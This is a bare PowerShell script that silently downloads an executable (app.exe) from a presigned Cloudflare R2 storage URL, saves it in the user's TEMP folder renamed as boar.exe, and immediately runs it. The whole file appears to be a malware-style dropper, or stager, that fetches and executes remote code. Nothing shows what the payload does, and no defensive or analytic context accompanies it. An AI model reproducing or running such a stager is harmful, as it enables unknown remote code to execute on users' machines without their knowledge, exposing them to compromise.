$Url = "https://upnow-prod.ff45e40d1a1c8f7e7de4e976d0c9e555.r2.cloudflarestorage.com/suPeOMCTpGQKSZTZu2vHKRsOZvk1/5d9c78a5-656b-4867-9896-f6fb1b357e2d?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=2f488bd324502ec20fee5b40e9c9ed39%2F20251019%2Fauto%2Fs3%2Faws4_request&X-Amz-Date=20251019T160757Z&X-Amz-Expires=43200&X-Amz-Signature=e437fbeb7917bf14f2ff0d4f1c9d25045d5812dccca14a259ef0182531b2d050&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3D%22app.exe%22"
$OutPath = "$env:TEMP\boar.exe"

$ProgressPreference = 'SilentlyContinue'
(New-Object Net.WebClient).DownloadFile($Url, $OutPath)
Start-Process $OutPath
